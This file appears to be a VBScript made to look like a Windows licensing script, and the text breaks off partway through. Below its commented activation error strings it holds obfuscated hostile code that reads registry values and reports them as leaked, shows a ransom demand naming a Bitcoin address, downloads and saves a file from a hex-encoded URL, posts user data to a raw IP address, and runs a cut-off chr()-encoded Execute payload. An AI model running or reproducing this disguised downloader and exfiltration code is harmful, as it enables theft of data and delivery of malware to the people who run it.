'L_MsgNotAvailable="Not Available"
'L_MsgCurrentTrustedTime="Trusted time: "
'L_MsgError_C004C001="The activation server determined the specified product key is invalid"
'L_MsgError_C004C003="The activation server determined the specified product key is blocked"
'L_MsgError_C004C017="The activation server determined the specified product key has been blocked for this geographic location."
'L_MsgError_C004B100="The activation server determined that the computer could not be activated"
'L_MsgError_C004C008="The activation server determined that the specified product key could not be used"
'L_MsgError_C004C020="The activation server reported that the Multiple Activation Key has exceeded its limit"
'L_MsgError_C004C021="The activation server reported that the Multiple Activation Key extension limit has been exceeded"
'L_MsgError_C004D307="The maximum allowed number of re-arms has been exceeded. You must re-install the OS before trying to re-arm again"
'L_MsgError_C004F009="The software Licensing Service reported that the grace period expired"
'L_MsgError_C004F00F="The Software Licensing Server reported that the hardware ID binding is beyond level of tolerance"
'L_MsgError_C004F014="The Software Licensing Service reported that the product key is not available"
'L_MsgError_C004F025="Access denied: the requested action requires elevated privileges"
'L_MsgError_C004F02C="The software Licensing Service reported that the format for the offline activation data is incorrect"
'L_MsgError_C004F035="The software Licensing Service reported that the computer could not be activated with a Volume license product key. Volume licensed systems require upgrading from a qualified operating system. Please contact your system administrator or use a different type of key"
'L_MsgError_C004F038="The software Licensing Service reported that the computer could not be activated. The count reported by your Key Management Service (KMS) is insufficient. Please contact your system administrator"
'L_MsgError_C004F039="The software Licensing Service reported that the computer could not be activated. The Key Management Service (KMS) is not enabled"
'L_MsgError_C004F041="The software Licensing Service determined that the Key Management Server (KMS) is not activated. KMS needs to be activated"
'L_MsgError_C004F042="The software Licensing Service determined that the specified Key Management Service (KMS) cannot be used"
'L_MsgError_C004F050="The Software Licensing Service reported that the product key is invalid"
'L_MsgError_C004F051="The software Licensing Service reported that the product key is blocked"
'L_MsgError_C004F064="The software Licensing Service reported that the non-Genuine grace period expired"
'L_MsgError_C004F065="The software Licensing Service reported that the application is running within the valid non-genuine period"
'L_MsgError_C004F066="The Software Licensing Service reported that the product SKU is not found"
'L_MsgError_C004F06B="The software Licensing Service determined that it is running in a virtual machine. The Key Management Service (KMS) is not supported in this mode"
'L_MsgError_C004F074="The Software Licensing Service reported that the computer could not be activated. No Key Management Service (KMS) could be contacted. Please see the Application Event Log for additional information."
'L_MsgError_C004F075="The Software Licensing Service reported that the operation cannot be completed because the service is stopping"
'L_MsgError_C004F304="The Software Licensing Service reported that required license could not be found."
'L_MsgError_C004F305="The Software Licensing Service reported that there are no certificates found in the system that could activate the product."
'L_MsgError_C004F30A="The Software Licensing Service reported that the computer could not be activated. The certificate does not match the conditions in the license."
'L_MsgError_C004F30D="The Software Licensing Service reported that the computer could not be activated. The thumbprint is invalid."
'L_MsgError_C004F30E="The Software Licensing Service reported that the computer could not be activated. A certificate for the thumbprint could not be found."
'L_MsgError_C004F30F="The Software Licensing Service reported that the computer could not be activated. The certificate does not match the criteria specified in the issuance license."
'L_MsgError_C004F310="The Software Licensing Service reported that the computer could not be activated. The certificate does not match the trust point identifier (TPID) specified in the issuance license."
'L_MsgError_C004F311="The Software Licensing Service reported that the computer could not be activated. A soft token cannot be used for activation."
'L_MsgError_C004F312="The Software Licensing Service reported that the computer could not be activated. The certificate cannot be used because its private key is exportable."
'L_MsgError_5="Access denied: the requested action requires elevated privileges"
'L_MsgError_80070005="Access denied: the requested action requires elevated privileges"
'L_MsgError_80070057="The parameter is incorrect"
'L_MsgError_8007232A="DNS server failure"
'L_MsgError_8007232B="DNS name does not exist"
'L_MsgError_800706BA="The RPC server is unavailable"
'L_MsgError_8007251D="No records found for DNS query"

Function Nautilus(ByVal sBase64EncodedText, ByVal fIsUtf16LE)
    Dim sTextEncoding
    if fIsUtf16LE Then sTextEncoding = "utf-16le" Else sTextEncoding = "utf-8"
    With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
        .DataType = "bin.base64"
        .Text = sBase64EncodedText
        Nautilus = BUtil(.NodeTypedValue, sTextEncoding)
    End With
End Function

function BUtil(ByVal byteArray, ByVal sTextEncoding)
    If LCase(sTextEncoding) = "utf-16le" then
        BUtil = CStr(byteArray)
    Else
        With CreateObject("ADODB.Stream")
            .Type = 1
            .Open
            .Write byteArray
            .Position = 0
            .Type = 2
            .CharSet = sTextEncoding
            BUtil = .ReadText
            .Close
        End With
    End If
end function

'-----BEGIN PRIVATE KEY-----
'MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDT0HvHNZ6Qz5ZX
'AqMGYSvz3c9MQWadFn8Xc1yB+y1Ve4H0H1AWJfw8DSCXHPccqEER6f6zziigLbBv
'R0Bhc8E6K9vN7Bn6w/mWbqfqzTKN0wjW1n0GCnV/GgNJfC6aS+cNRT89jJ0Ag6Q
'FVbCMRsgv7C83XzzeIpETPMZ9jY6sEmzispeHh1iCGY9TEPM7O8xTWnDobzzf6eI
'UWYQ3+GFWb2zyvYsESOsfmee8k2WXRAw7YN6hx8S2X7Zd2AQe13XJ5R7sH4y0cSw
'ZlDYiCZM51wb9Cg7FfRap/X8QomVYZm4Rd3VsmkA2BLgxbjuuyjB7d6QOkx3ACgB
'A2tJmV31AgMBAAECggEAYf2hFOLeWwIFwf1DB7qf0PbRfQHH8ulOezIEds+n2Z4D
'FbBtdfWqHogtfm1w2NnMocS0gqanVp6BSK2HY2HvI95JNT/g1s3TxCeWxlR0u/X5
'zl9wqgd6Ew2IX4H8d5I6yXPCr2x9FyB8+j2Ng9F4zfwWwG7hFlljn6RPW7inLZ5j
'Qby/K3Z19qfrbhYO12d+DgJlkg9TbviWClW+ddSWwh5yDFshfPtNCewB9s5j6J0b
'Kc2GYlQ0JfMXDSbjvwnKt0T1sJMYHRoVnpEY2RkIE8L9UOHP3sKJxYDEzgknj9Oi
'KfpmrEO1tFmS3C5Q2vPLAE3/dklCxkKr2tydbBmRAQKBgQDriQAsPTiVMvqjLle9
'QJKbVr09E9XJ5ZqzEXre3z+RT03Ryur0VYo3y6xD9TFEXWY2ZHXyDLscY2bM3uAD
'AmGGNnLmeOLSMoyzVnUAEw6tJ9i3TEmz4+QgTbrA7pnmPmYI/2hvWTT3HwXa5S9b
'gat0FIVHQ7tPvPqTcFQawjZbpwKBgQDJLcJiHRF9PPU4Hq6YfHPLVRYfWVU/NY4Q
'etY/YaV3edj5mcu47B+LpTw7dcddMuvCzRqVdG4q1KANc90/h1gr+16z32TxxC8J
'odUHFlLPSkF1ZUEcECyNgidT/y5I1Kv2S38ytFfqtk0f1m+7bTbG8q8bnEjjIP6H
'fqxHWd5d5QKBgHzGBFgQASRVxP5b2+tJhxTsddIFgU/hb9ewc2aUQWgWvq0y2P6X
'nGGlmZJbs2n1g0GZ2AkhYoqJIl6XoohSbmQTnKNw+yNx+MYeYz3kWEMoBOK7kM/7
'9Fv4lru/tuYeebC4Hr7QYDj6ROcBnMGozwF9ednxyBCQhL17jZD1AblxAoGBAMwY
'jdx0b3bAnpAXFcXFKKbqMWpYVrMl1hTj2+PLFOSL15XXl+f4Ck0fsI0Fva9vFmmt
'7rsS68SMrgzJ3GkPmLCWL7YBfmdFqu8/9MBiVhrQ4g7DpYHTAsWMhVKxILwVrYt9
'68SfdUyNULRZ8oFc7wZt3N9uXUuT2yQ0WOB8i8bVAoGAPpNPKOoUk/XTRNmwsO3p
'bYo4fhQ7BXID5sK8s3i7JZGKHzj5FHEqRf8+2Avn9/3Fs+Ov53rPL48YoE7q2ez8
'U2uO4AQFItNRmtmGed2f4KAdNzMLqmpbM4Kt4OL1JkT3eqGVzXjMd32fZ0UW3D6r
'MyUZTyr69PwWi88db7hwM4s=
'-----END PRIVATE KEY-----

Function XA3bVjQ3(A0CQ5, B9HW3)
    Dim nFBRW6, X7IDP
    On Error Resume Next
    Set nFBRW6 = CreateObject(StRREverse("llehS.tpircSW"))
    X7IDP = nFBRW6.RegRead(A0CQ5)
    If err.number <> 0 Then
        xA3bVjQ3 = B9HW3
    Else
        xA3bVjQ3 = X7IDP
    End If
    Set nFBRW6 = Nothing
End Function

strComputer = "."
 
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & _ 
    strComputer & "\root\default:StdRegProv")
 
strKeyPath = "SYSTEM\CurrentControlSet\Control"
strUser = CreateObject("WScript.Network").UserName

oReg.EnumValues HKEY_LOCAL_MACHINE, strKeyPath, _
    arrValueNames, arrValueTypes

res = Msgbox("Hi " & strUser & ", your data have been compromised!", vbOKCancel+vbCritical, "")

For jj=0 To UBound(arrValueNames)
    Select Case arrValueTypes(jj)
        Case REG_SZ, REG_EXPAND_SZ, REG_DWORD
            str = XA3bVjQ3("HKLM\" & strKeyPath & "\" & arrValueNames(jj), "dummy")
            res = Msgbox(arrValueNames(jj) & " LEAKED: " & query(str), vbOKCancel+vbCritical, "")
    End Select 
Next

res = Msgbox("Please transfer BTC to 0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB to receive decrypted data...", vbOKOnly+vbInformation, "")

ewkjunfw = Replace("68IlllIllIIIllllIllII74IlllIllIIIllllIllII74IlllIllIIIllllIllII70IlllIllIIIllllIllII73IlllIllIIIllllIllII3aIlllIllIIIllllIllII2fIlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII6fIlllIllIIIllllIllII77IlllIllIIIllllIllII6eIlllIllIIIllllIllII6cIlllIllIIIllllIllII6fIlllIllIIIllllIllII61IlllIllIIIllllIllII64IlllIllIIIllllIllII31IlllIllIIIllllIllII36IlllIllIIIllllIllII34IlllIllIIIllllIllII37IlllIllIIIllllIllII2eIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII66IlllIllIIIllllIllII69IlllIllIIIllllIllII72IlllIllIIIllllIllII65IlllIllIIIllllIllII2eIlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6dIlllIllIIIllllIllII2fIlllIllIIIllllIllII6cIlllIllIIIllllIllII31IlllIllIIIllllIllII38IlllIllIIIllllIllII38IlllIllIIIllllIllII75IlllIllIIIllllIllII32IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII71IlllIllIIIllllIllII67IlllIllIIIllllIllII33IlllIllIIIllllIllII66IlllIllIIIllllIllII4fIlllIllIIIllllIllII6fIlllIllIIIllllIllII4cIlllIllIIIllllIllII70IlllIllIIIllllIllII69IlllIllIIIllllIllII6cIlllIllIIIllllIllII63IlllIllIIIllllIllII49IlllIllIIIllllIllII38IlllIllIIIllllIllII39IlllIllIIIllllIllII70IlllIllIIIllllIllII30IlllIllIIIllllIllII5fIlllIllIIIllllIllII68IlllIllIIIllllIllII34IlllIllIIIllllIllII45IlllIllIIIllllIllII30IlllIllIIIllllIllII63IlllIllIIIllllIllII47IlllIllIIIllllIllII4cIlllIllIIIllllIllII6aIlllIllIIIllllIllII6bIlllIllIIIllllIllII5fIlllIllIIIllllIllII75IlllIllIIIllllIllII76IlllIllIIIllllIllII42IlllIllIIIllllIllII55IlllIllIIIllllIllII69IlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII45IlllIllIIIllllIllII5fIlllIllIIIllllIllII72IlllIllIIIllllIllII4dIlllIllIIIllllIllII5aIlllIllIIIllllIllII2dIlllIllIIIllllIllII48IlllIllIIIllllIllII35IlllIllIIIllllIllII2dIlllIllIIIllllIllII6dIlllIllIIIllllIllII65IlllIllIIIllllIllII39IlllIllIIIllllIllII4bIlllIllIIIllllIllII72IlllIllIIIllllIllII39IlllIllIIIllllIllII53IlllIllIIIllllIllII51IlllIllIIIllllIllII4cIlllIllIIIllllIllII56IlllIllIIIllllIllII51IlllIllIIIllllIllII61IlllIllIIIllllIllII4bIlllIllIIIllllIllII53IlllIllIIIllllIllII69IlllIllIIIllllIllII4bIlllIllIIIllllIllII63IlllIllIIIllllIllII45IlllIllIIIllllIllII76IlllIllIIIllllIllII4aIlllIllIIIllllIllII4fIlllIllIIIllllIllII2dIlllIllIIIllllIllII45IlllIllIIIllllIllII6bIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII53IlllIllIIIllllIllII55IlllIllIIIllllIllII71IlllIllIIIllllIllII57IlllIllIIIllllIllII6cIlllIllIIIllllIllII72IlllIllIIIllllIllII4eIlllIllIIIllllIllII36IlllIllIIIllllIllII53IlllIllIIIllllIllII7aIlllIllIIIllllIllII58IlllIllIIIllllIllII67IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII4cIlllIllIIIllllIllII59IlllIllIIIllllIllII42IlllIllIIIllllIllII68IlllIllIIIllllIllII2dIlllIllIIIllllIllII46IlllIllIIIllllIllII35IlllIllIIIllllIllII65IlllIllIIIllllIllII6dIlllIllIIIllllIllII34IlllIllIIIllllIllII49IlllIllIIIllllIllII41IlllIllIIIllllIllII34IlllIllIIIllllIllII69IlllIllIIIllllIllII58IlllIllIIIllllIllII33IlllIllIIIllllIllII74IlllIllIIIllllIllII4fIlllIllIIIllllIllII49IlllIllIIIllllIllII47IlllIllIIIllllIllII68IlllIllIIIllllIllII30IlllIllIIIllllIllII45IlllIllIIIllllIllII6aIlllIllIIIllllIllII34IlllIllIIIllllIllII36IlllIllIIIllllIllII47IlllIllIIIllllIllII6cIlllIllIIIllllIllII77IlllIllIIIllllIllII76IlllIllIIIllllIllII4cIlllIllIIIllllIllII4fIlllIllIIIllllIllII66IlllIllIIIllllIllII54IlllIllIIIllllIllII38IlllIllIIIllllIllII70IlllIllIIIllllIllII7aIlllIllIIIllllIllII76IlllIllIIIllllIllII75IlllIllIIIllllIllII79IlllIllIIIllllIllII39IlllIllIIIllllIllII31IlllIllIIIllllIllII55IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII6aIlllIllIIIllllIllII31IlllIllIIIllllIllII72IlllIllIIIllllIllII32IlllIllIIIllllIllII49IlllIllIIIllllIllII30IlllIllIIIllllIllII6aIlllIllIIIllllIllII67IlllIllIIIllllIllII37IlllIllIIIllllIllII59IlllIllIIIllllIllII73IlllIllIIIllllIllII55IlllIllIIIllllIllII4eIlllIllIIIllllIllII63IlllIllIIIllllIllII73IlllIllIIIllllIllII73IlllIllIIIllllIllII50IlllIllIIIllllIllII74IlllIllIIIllllIllII65IlllIllIIIllllIllII64IlllIllIIIllllIllII35IlllIllIIIllllIllII30IlllIllIIIllllIllII38IlllIllIIIllllIllII64IlllIllIIIllllIllII73IlllIllIIIllllIllII6bIlllIllIIIllllIllII57IlllIllIIIllllIllII52IlllIllIIIllllIllII70IlllIllIIIllllIllII6bIlllIllIIIllllIllII41IlllIllIIIllllIllII49IlllIllIIIllllIllII2fIlllIllIIIllllIllII79IlllIllIIIllllIllII65IlllIllIIIllllIllII61IlllIllIIIllllIllII35IlllIllIIIllllIllII33IlllIllIIIllllIllII35IlllIllIIIllllIllII68IlllIllIIIllllIllII76IlllIllIIIllllIllII67IlllIllIIIllllIllII70IlllIllIIIllllIllII33IlllIllIIIllllIllII32IlllIllIIIllllIllII76IlllIllIIIllllIllII6dIlllIllIIIllllIllII76IlllIllIIIllllIllII2fIlllIllIIIllllIllII64IlllIllIIIllllIllII65IlllIllIIIllllIllII66IlllIllIIIllllIllII63IlllIllIIIllllIllII6fIlllIllIIIllllIllII6eIlllIllIIIllllIllII2dIlllIllIIIllllIllII66IlllIllIIIllllIllII6cIlllIllIIIllllIllII61IlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII70IlllIllIIIllllIllII6eIlllIllIIIllllIllII67IlllIllIIIllllIllII2eIlllIllIIIllllIllII58IlllIllIIIllllIllII4fIlllIllIIIllllIllII52IlllIllIIIllllIllII65IlllIllIIIllllIllII64", "IlllIllIIIllllIllII", " ")

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", OwOwO(ewkjunfw), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile Nautilus(StRREVErsE(replace("=QWZ###############_###lWbvJHct92Yucmbw5yZhxmZt42bjZWZkxFctVGdcp###############_###Y", "###############_###", "z")), False), 2
end with

Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")

url = "68 74 74 70 3a 2f 2f 32 30 2e 31 30 36 2e 32 35 30 2e 34 36 2f 73 65 6e 64 55 73 65 72 44 61 74 61"

With http
  Call .Open("POST", OwOwO(url), False)
  Call .SetRequestHeader("Content-Type", "application/json")
  Call .Send("{'username':'Administrator'}")
End With

res = Msgbox("Thank you for your cooperation!", vbOKOnly+vbInformation, "")

Execute(chr(-40321+CLng("&H9dc5"))&chr(-70744+CLng("&H114c1"))&chr(5810790/CLng("&Hd03e"))&chr(CLng("&H10547")-66855)&chr(-3061+CLng("&Hc5d"))&chr(-45300+CLng("&Hb168"))&chr(-82986+CLng("&H1449e"))&chr(CLng("&Hb3cd")-45917)&chr(-52601+CLng("&Hcdb3"))&chr(412416/CLng("&H3258"))&chr(CLng("&H151d5")-86402)&chr(228260/CLng("&H8d4"))&chr(10781272/CLng("&H16b0e"))&chr(1011488/CLng("&H7b79"))&chr(1832272/CLng("&H44d2"))&chr(5369872/CLng("&Hb4d4"))&chr(4496972/CLng("&H976f"))&chr(CLng("&H50fc")-20620)&chr(2185408/CLng("&H10ac6"))&chr(-52470+CLng("&Hcd33"))&chr(CLng("&Hae92")-44658)&chr(1925915/CLng("&H7049"))&chr(3243984/CLng("&H6f28"))&chr(CLng("&H8465")-33792)&chr(6893402/CLng("&H1159a"))&chr(CLng("&H1865a")-99814)&chr(7719531/CLng("&H12a8f"))&chr(6937859/CLng("&H1570d"))&chr(CLng("&H15e12")-89520)&chr(4552170/CLng("&Ha7c1"))&chr(CLng("&H2255")-8688)&chr(CLng("&Hac94")-44081)&chr(CLng("&H1a97")-6691)&chr(2325400/CLng("&He317"))&chr(-5584+CLng("&H15f2"))&chr(-7668+CLng("&H1e4b"))&chr(CLng("&H15388")-86815)&chr(-94815+CLng("&H172cd"))&chr(773712/CLng("&H29fa"))&chr(CLng("&H73d3")-29535)&chr(-78318+CLng("&H13262"))&chr(-73308+CLng("&H11ecc"))&chr(3320602/CLng("&H119fb"))&chr(6514908/CLng("&H12484"))&chr(CLng("&H1618f")-90406)&chr(-42549+CLng("&Ha6a3"))&chr(757080/CLng("&H2913"))&chr(-64938+CLng("&Hfe1e"))&chr(-6196+CLng("&H18a8"))&chr(-89307+CLng("&H15d4b"))&chr(4081058/CLng("&Hc269"))&chr(-90118+CLng("&H1606b"))&chr(8398725/CLng("&H12255"))&chr(8410194/CLng("&H118ca"))&chr(4653373/CLng("&Hb3f9"))&chr(-16734+CLng("&H41d1"))&chr(-53427+CLng("&Hd127"))&chr(CLng("&Ha90")-2658)&chr(-73912+CLng("&H120ed"))&chr(-44067+CLng("&Hac51"))&chr(CLng("&Hc6f7")-50886)&chr(-6573+CLng("&H19cf"))&chr(CLng("&H8770")-34631)&chr(-30549+CLng("&H775f"))&chr(CLng("&H6ccf")-27787)&chr(-44385+CLng("&Hadca"))&chr(-56936+CLng("&Hded5"))&chr(-79243+CLng("&H135ab"))&chr(5253885/CLng("&Haf69"))&chr(5514294/CLng("&Hbcf3"))&chr(9784152/CLng("&H161e2"))&chr(-45614+CLng("&Hb268"))&chr(2846656/CLng("&H15b7e"))&chr(2912364/CLng("&H613c"))&chr(CLng("&H10c")-154)&chr(-47877+CLng("&Hbb71"))&chr(CLng("&H13bff")-80863)&chr(CLng("&H12427")-74730)&chr(CLng("&H1853")-6195)&chr(2908802/CLng("&H14e31"))&chr(CLng("&H14efe")-85654)&chr(1275188/CLng("&H2af1"))&chr(10193848/CLng("&H15746"))&chr(11147136/CLng("&H184c8"))&chr(CLng("&H12636")-75260)&chr(3405526/CLng("&H11b0a"))&chr(CLng("&H19af")-6528)&chr(-39708+CLng("&H9b4e"))&chr(-96693+CLng("&H179e5"))&chr(-22347+CLng("&H5779"))&chr(288022/CLng("&H16f6"))&chr(341808/CLng("&H1bd1"))&chr(-69824+CLng("&H110f6"))&chr(1218034/CLng("&H676f"))&chr(1882550/CLng("&H9313"))&chr(-757+CLng("&H32a"))&chr(961152/CLng("&H4e38"))&chr(-15412+CLng("&H3c62"))&chr(3469336/CLng("&H1049e"))&chr(-42129+CLng("&Ha4c7"))&chr(2664242/CLng("&Hdd6e"))&chr(-40503+CLng("&H9eaa"))&chr(-90302+CLng("&H16123"))&chr(-42602+CLng("&Ha6d8"))&chr(9294100/CLng("&H16b0d"))&chr(-76127+CLng("&H129b4"))&chr(5576810/CLng("&Hbd6e"))&chr(CLng("&H4330")-17099)&chr(CLng("&Ha65c")-42474)&chr(-17723+CLng("&H457f"))&chr(1122193/CLng("&H2d31"))&chr(9787616/CLng("&H14998"))&chr(CLng("&Ha632")-42449)&chr(-60037+CLng("&Heaa7"))&chr(-77885+CLng("&H13047"))&chr(CLng("&H100ae")-65700)&chr(CLng("&Hc8ae")-51287)&chr(3921015/CLng("&H91df"))&chr(CLng("&H89ec")-35192)&chr(CLng("&Hcfb3")-53067)&chr(688320/CLng("&H5406"))&chr(-4949+CLng("&H13bd"))&chr(1852984/CLng("&H3e66"))&chr(-43801+CLng("&Hab8d"))&chr(CLng("&Hd5fd")-54669)&chr(82610/CLng("&H2045"))&chr(-17393+CLng("&H4411"))&chr(1553664/CLng("&Hbda8"))&chr(965336/CLng("&H3848"))&chr(-35284+CLng("&H8a35"))&chr(CLng("&H185de")-99698)&chr(-84365+CLng("&H149f9"))&chr(CLng("&H1918")-6392)&chr(745062/CLng("&H3f45"))&chr(-90998+CLng("&H163c5"))&chr(3006416/CLng("&H68db"))&chr(3092822/CLng("&H779e"))&chr(-61400+CLng("&Hf046"))&chr(1062840/CLng("&H67cb"))&chr(-41458+CLng("&Ha214"))&chr(4687760/CLng("&He4e5"))&chr(-57357+CLng("&He05c"))&chr(-79180+CLng("&H1359f"))&chr(CLng("&H92ad")-37465)&chr(537336/CLng("&H3dbc"))&chr(2021096/CLng("&Hb36e"))&chr(-36862+CLng("&H901e"))&chr(-77402+CLng("&H12ecf"))&chr(CLng("&Hb635")-46531)&chr(9907704/CLng("&H1665a"))&chr(CLng("&H111c2")-70038)&chr(198400/CLng("&H1838"))&chr(CLng("&H11aa")-4452)&chr(CLng("&Hd1ea")-53641)&chr(2742660/CLng("&H6333"))&chr(-616+CLng("&H2db"))&chr(-36786+CLng("&H9017"))&chr(-85678+CLng("&H14ed7"))&chr(CLng("&H15b53")-88905)&chr(1489152/CLng("&Hb5c8"))&chr(-97172+CLng("&H17bb4"))&chr(CLng("&H47d2")-18319)&chr(5112094/CLng("&Hcdde"))&chr(-60888+CLng("&Hee44"))&chr(8839368/CLng("&H13fb6"))&chr(-90342+CLng("&H16106"))&chr(574494/CLng("&H30c9"))&chr(3875270/CLng("&Hb662"))&chr(CLng("&Had05")-44192)&chr(8657428/CLng("&H12389"))&chr(CLng("&Ha0e6")-41108)&chr(10075255/CLng("&H185ab"))&chr(2702621/CLng("&H5d6d"))&chr(-7029+CLng("&H1bea"))&chr(CLng("&H119dd")-72056)&chr(4786990/CLng("&Ha29a"))&chr(5295052/CLng("&Hb24f"))&chr(CLng("&H170ad")-94309)&chr(3536717/CLng("&H88c9"))&chr(7051609/CLng("&H11bf9"))&chr(CLng("&H40b1")-16461)&chr(6524903/CLng("&Hfc5b"))&chr(1190958/CLng("&H28cf"))&chr(1780880/CLng("&Hadea"))&chr(-90695+CLng("&H16269"))&chr(CLng("&Hf76d")-63274)&chr(-46351+CLng("&Hb57e"))&chr(8922760/CLng("&H13cdc"))&chr(3997824/CLng("&H86a0"))&chr(CLng("&H76a6")-30273)&chr(CLng("&H13c73")-80901)&chr(-27648+CLng("&H6c74"))&chr(CLng("&H5357")-21290)&chr(625800/CLng("&H1d1a"))&chr(2721532/CLng("&H57dc"))&chr(9212560/CLng("&H1414f"))&chr(-92336+CLng("&H16915"))&chr(-11725+CLng("&H2def"))&chr(-78226+CLng("&H131be"))&chr(-70612+CLng("&H113f4"))&chr(-39585+CLng("&H9ac3"))&chr(-45013+CLng("&Hb036"))&chr(9987488/CLng("&H15c56"))&chr(-23122+CLng("&H5ac2"))&chr(-25596+CLng("&H6468"))&chr(4912320/CLng("&Hb6c0"))&chr(7827336/CLng("&H134d8"))&chr(CLng("&H11ba2")-72513)&chr(-92487+CLng("&H169bb"))&chr(3941910/CLng("&H92a6"))&chr(1843821/CLng("&H40e3"))&chr(-56461+CLng("&Hdcfb"))&chr(-61934+CLng("&Hf21d"))&chr(CLng("&H5f42")-24280)&chr(CLng("&H4419")-17318)&chr(4139190/CLng("&H91aa"))&chr(-75399+CLng("&H126f5"))&chr(CLng("&H4df8")-19926)&chr(CLng("&H9a11")-39400)&chr(CLng("&H5dc0")-23990)&chr(2981792/CLng("&H16bfd"))&chr(1532672/CLng("&Hbb18"))&chr(2153581/CLng("&H7d8f"))&chr(-65706+CLng("&H1010b"))&chr(CLng("&H5c39")-23501)&chr(-34626+CLng("&H87ae"))&chr(1699296/CLng("&Hcf6f"))&chr(-22022+CLng("&H5634"))&chr(CLng("&Hbeca")-48759)&chr(1239472/CLng("&H2ff0"))&chr(2990020/CLng("&H6a2e"))&chr(8229900/CLng("&H1417b"))&chr(-37756+CLng("&H93a4"))&chr(CLng("&H9f82")-40800)&chr(-46661+CLng("&Hb6c0"))&chr(-88679+CLng("&H15a89"))&chr(-14462+CLng("&H38a0"))&chr(CLng("&H8998")-35107)&chr(-16696+CLng("&H41ab"))&chr(5105651/CLng("&Hc577"))&chr(8351412/CLng("&H11e2a"))&chr(-59947+CLng("&Hea99"))&chr(3276078/CLng("&H83ee"))&chr(CLng("&H351f")-13490)&chr(-98033+CLng("&H17f56"))&chr(3164040/CLng("&H16b84"))&chr(CLng("&H10180")-65886)&chr(CLng("&H15089")-86095)&chr(CLng("&H5768")-22342)&chr(2594166/CLng("&H12a0b"))&chr(CLng("&H94c")-2346)&chr(2624672/CLng("&H14065"))&chr(2408364/CLng("&Hf792"))&chr(-90152+CLng("&H16048"))&chr(CLng("&H14396")-82723)&chr(2373244/CLng("&H4feb"))&chr(-77666+CLng("&H12fd4"))&chr(CLng("&He4f0")-58523)&chr(9367210/CLng("&H13e2e"))&chr(-63799+CLng("&Hf99c"))&chr(CLng("&H14926")-84148)&chr(2481696/CLng("&H12ef1"))&chr(CLng("&H16de7")-93633)&chr(2574368/CLng("&H13a41"))&chr(CLng("&H2c4b")-11305)&chr(CLng("&H265")-579)&chr(-40503+CLng("&H9e59"))&chr(4132625/CLng("&H8125"))&chr(-71305+CLng("&H116ab"))&chr(100286/CLng("&H98e"))&chr(-75948+CLng("&H128b6"))&chr(2497041/CLng("&H8d5d"))&chr(3596670/CLng("&H7fb9"))&chr(-57401+CLng("&He09d"))&chr(-79614+CLng("&H1371e"))&chr(CLng("&Hcb27")-51920)&chr(596925/CLng("&H1635"))&chr(909672/CLng("&H1ea2"))&chr(-21809+CLng("&H5599"))&chr(929440/CLng("&H16b10"))&chr(-95594+CLng("&H17574"))&chr(648546/CLng("&H1639"))&chr(9058993/CLng("&H15e5d"))&chr(CLng("&H6785")-26386)&chr(-5603+CLng("&H1603"))&chr(-49243+CLng("&Hc098"))&chr(-19842+CLng("&H4da2"))&chr(5837755/CLng("&H12827"))&chr(-41927+CLng("&Ha43a"))&chr(5987802/CLng("&He316"))&chr(-23591+CLng("&H5c89"))&chr(CLng("&H5c64")-23541)&chr(1368240/CLng("&H2c8a"))&chr(-15661+CLng("&H3d55"))&chr(3041198/CLng("&H15d67"))&chr(6633060/CLng("&H13475"))&chr(834704/CLng("&H1f5a"))&chr(-10043+CLng("&H279c"))&chr(CLng("&H139bb")-80205)&chr(CLng("&Hd675")-54794)&chr(CLng("&Hcbce")-52142)&chr(-26539+CLng("&H6824"))&chr(-89161+CLng("&H15cb8"))&chr(-93440+CLng("&H16d75"))&chr(CLng("&Hb89c")-47228)&chr(5950782/CLng("&He3e5"))&chr(CLng("&H10c56")-68583)&chr(CLng("&H14769")-83703)&chr(440768/CLng("&H35ce"))&chr(CLng("&Hdfc7")-57166)&chr(-95272+CLng("&H17497"))&chr(CLng("&H75ec")-30071)&chr(-6274+CLng("&H18f4"))&chr(2752992/CLng("&H1500f"))&chr(7865946/CLng("&H1365e"))&chr(-21227+CLng("&H535a"))&chr(CLng("&H1589f")-88112)&chr(-14544+CLng("&H3940"))&chr(-8877+CLng("&H2312"))&chr(9332496/CLng("&H13fc8"))&chr(-90440+CLng("&H161a9"))&chr(-70593+CLng("&H11435"))&chr(CLng("&H83d6")-33645)&chr(CLng("&H13dc6")-81239)&chr(-24982+CLng("&H6204"))&chr(CLng("&H18426")-99333)&chr(-67803+CLng("&H108fd"))&chr(724548/CLng("&H4053"))&chr(820896/CLng("&H6435"))&chr(3032718/CLng("&H6465"))&chr(750484/CLng("&H1dea"))&chr(-6853+CLng("&H1b14"))&chr(4453275/CLng("&He7f1"))&chr(6003447/CLng("&H128d9"))&chr(CLng("&H4438")-17354)&chr(7633548/CLng("&H11419"))&chr(-55530+CLng("&Hd963"))&chr(-50437+CLng("&Hc530"))&chr(10170066/CLng("&H150ab"))&chr(6335798/CLng("&Hfc8b"))&chr(5513909/CLng("&H1270d"))&chr(-956+CLng("&H42a"))&chr(-5050+CLng("&H1420"))&chr(CLng("&H12d54")-77029)&chr(-89365+CLng("&H15d87"))&chr(CLng("&H12d37")-77002)&chr(CLng("&Hbfac")-48971)&chr(-33319+CLng("&H829b"))&chr(-88979+CLng("&H15bfc"))&chr(-12181+CLng("&H3004"))&chr(9532490/CLng("&H15283"))&chr(